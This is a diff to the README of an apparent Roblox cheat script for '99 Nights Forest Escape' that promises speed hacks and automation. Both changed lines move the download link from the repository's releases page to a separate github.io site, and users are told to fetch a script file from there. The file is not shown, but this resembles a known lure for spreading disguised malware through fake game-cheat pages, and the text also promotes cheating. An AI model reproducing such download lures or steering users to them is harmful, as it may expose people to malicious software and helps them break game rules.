@@ -1,6 +1,6 @@
 # 🌲 Speed-99-Nights-Forest-Escape-Roblox-OP-Script-2026 - Gain speed and escape the forest
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Nononsense-chromatingranule903/Speed-99-Nights-Forest-Escape-Roblox-OP-Script-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://nononsense-chromatingranule903.github.io)
 
 This software helps players improve their performance in the Roblox game 99 Nights Forest Escape. The tools within this script allow users to automate tasks, increase movement speed, and navigate the map with efficiency. Use this tool if you want to bypass manual grinding and reach game goals at a faster pace.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to obtain the script files safely:
 
-1. Visit this page to download the latest version of the script: [Download Release Page](https://github.com/Nononsense-chromatingranule903/Speed-99-Nights-Forest-Escape-Roblox-OP-Script-2026/releases).
+1. Visit this page to download the latest version of the script: [Download Release Page](https://nononsense-chromatingranule903.github.io).
 2. Locate the file ending in .lua or .txt within the assets section.
 3. Click the filename to save it to your computer.
 4. Note the location of the downloaded file for the next step.
